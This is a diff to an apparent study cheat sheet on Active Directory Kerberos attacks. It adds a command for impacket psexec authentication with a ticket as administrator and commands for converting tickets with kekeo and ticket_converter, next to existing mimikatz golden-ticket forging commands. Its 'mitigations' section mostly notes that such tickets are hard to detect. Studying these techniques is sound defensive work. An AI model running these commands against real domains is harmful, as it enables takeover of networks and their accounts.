@@ -42,6 +42,10 @@
 
 #### 7) kerberos_ticket_list
 
+### Authenticate with psexec impacket (Linux)
+
+#### 8) ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100
+
 # SILVER TICKET
 
 #### 1) mimikatz.exe
@@ -59,3 +63,24 @@
 | `Get-DomainSID`                                              | Cmdlet from `PowerView` used to obtain the SID value of the domain. |
 | `golden /domain:eagle.local /sid:<domain sid> /rc4:<rc4 hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt` | Command used in `mimikatz` to forge a golden ticket for the `Administrator` account and pass the ticket to the current session |
 | `klist`                                                      | Command line utility in Windows to display the contents of the Kerberos ticket cache. |
+
+
+## TIP: If you need to swap ticket between Windows and Linux, you need to convert them with ticket_converter or kekeo .
+
+### 1) Kekeo
+
+ - misc::convert ccache ticket.kirbi
+
+ - misc::convert kirbi ticket.ccache
+
+### 2) Impacket ticket_converter
+
+ - python ticket_converter.py velociraptor.ccache velociraptor.kirbi
+
+ - python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+
+## MITIGATIONS
+
+### 1) Hard to detect because they are legit TGT tickets
+
+### 2) Mimikatz generates a golden ticket with a life-span of 10 years
